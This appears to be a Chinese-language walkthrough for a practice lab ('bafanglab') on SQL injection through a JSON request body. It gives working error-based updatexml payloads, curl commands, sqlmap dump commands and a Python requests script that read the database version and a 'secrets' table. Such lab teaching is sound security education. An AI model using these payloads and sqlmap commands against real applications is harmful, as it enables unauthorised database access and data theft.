先分清：本关的注入点在 JSON 请求体里

注入点是 JSON body 的 username 字段，提交到 modules/sqli/json.php，Content-Type 为 application/json。服务端 json_decode 后把 username 直接拼进 WHERE username = '$name'，页面会回显执行过的 SQL，方便对照。

  • 参数位置不同：GET 注入在 URL 查询串，POST 表单在 body 的 key=value，本关在 body 的 JSON 结构里，必须保证 Content-Type 为 application/json。
  • JSON 转义规则：字符串值里的双引号写成 \"，反斜杠写成 \\，换行写成 \n；单引号无需转义。
  • 工具入口不同：GET 用 sqlmap -u "url?id=1"；表单 POST 用 --data "k=v"；JSON POST 要用 --data '{"k":"v"}' 并指定 -p 参数名。

Burp Suite（抓包改 JSON，最直观）

解决什么问题：JSON body 在浏览器里不好直接修改，Burp 可以拦下请求在 Raw 里改 JSON 值，反复 Repeater 调试闭合符与注释符。

1. 浏览器代理设为 127.0.0.1:8080，打开 {{SITE}}/modules/sqli/json.php
2. 在页面 JSON 编辑框里填 {"username":"admin'"} ，点「提交查询」
3. Proxy → HTTP history 找到 POST /bafanglab/modules/sqli/json.php
4. 右键 → Send to Repeater，在 Raw 里直接改 username 的值，点 Send
5. 对照响应：MySQL 错误 / 查询结果表格 / 页面回显的「执行 SQL」
  • Repeater：手动改 JSON 值逐条试闭合方式（'、"）与注释符（#、-- 、/**/）。
  • Intruder：把 username 的值设成 payload 位置，加载字典批量跑，按响应长度/关键字差异找注入。
  • 保存请求文件：Repeater 里右键 → Save item，存成 burp_json.txt，供 sqlmap 的 -r 使用。

curl（命令行快速验证）

解决什么问题：不开代理、不打开浏览器，一条命令直接发 JSON 请求验证注入。

# 1. 确认报错回显
curl -X POST {{SITE}}/modules/sqli/json.php \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''"}'

# 2. 报错注入读版本
curl -X POST {{SITE}}/modules/sqli/json.php \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' or updatexml(1,concat(0x7e,version()),1)-- -"}'

# 3. 读通关凭证
curl -X POST {{SITE}}/modules/sqli/json.php \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}'

Shell 转义提示：bash 里单引号字符串内不能直接放单引号，用 '\'' 闭合+转义+重新打开。Windows PowerShell 用双引号包裹 JSON，内部双引号转义为 \"。

sqlmap（自动化拖库）

解决什么问题：自动识别 JSON 字段、判断注入类型、枚举库表并导出数据。

# 1. 直接指定 JSON body（-p 锁定注入点）
sqlmap -u "{{SITE}}/modules/sqli/json.php" \
  --data '{"username":"admin"}' -p username --dbs --batch

# 2. 读 Burp 保存的请求文件（推荐，method/Content-Type 全部原样带上）
sqlmap -r burp_json.txt --level=3 --risk=2 --batch

# 3. 导出 secrets 表（通关凭证）
sqlmap -r burp_json.txt -D bafanglab -T secrets --dump --batch

# 4. 只跑报错注入，减少无效探测
sqlmap -r burp_json.txt --technique=E --batch

注意：sqlmap 对 JSON 的支持需要 --data 里是合法 JSON，且 -p 指定的字段名要和 JSON key 完全一致。

Python requests（批量脚本）

解决什么问题：把 payload 参数化，批量跑字典、比较响应，适合写报错/盲注的自动化验证。

import requests, json

url = "{{SITE}}/modules/sqli/json.php"
headers = {"Content-Type": "application/json"}

# 报错注入读通关凭证
payload = {"username": "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}
r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
print(r.status_code, r.text[:300])
  • 与表单 POST 的差别：表单用 data=dict（自动编码为 x-www-form-urlencoded）；JSON 必须用 data=json.dumps(dict) 并手动设置 Content-Type: application/json，或直接用 json=dict（requests 会自动设置头）。
  • 盲注判断：固定其他字段，只替换 username，比较 len(r.text) 或耗时差异。
